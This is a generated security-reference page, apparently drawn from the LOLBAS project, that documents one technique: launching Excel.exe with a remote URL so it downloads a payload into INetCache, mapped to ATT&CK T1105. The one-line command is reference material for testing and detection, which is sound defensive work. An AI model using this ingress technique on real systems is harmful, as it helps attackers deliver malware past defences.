---
parsed_by: focuslocust
source: commands
type: generated
---
# Excel Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Excel.exe

Tool page: [Excel.exe](../../tools/windows/excel.exe.md)

### It will download a remote payload and place it in INetCache.

```text
Excel.exe {REMOTEURL}
```

Description:

Downloads payload from remote server

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Excel.yml` |
| Evidence | Command preserved from source parser. |
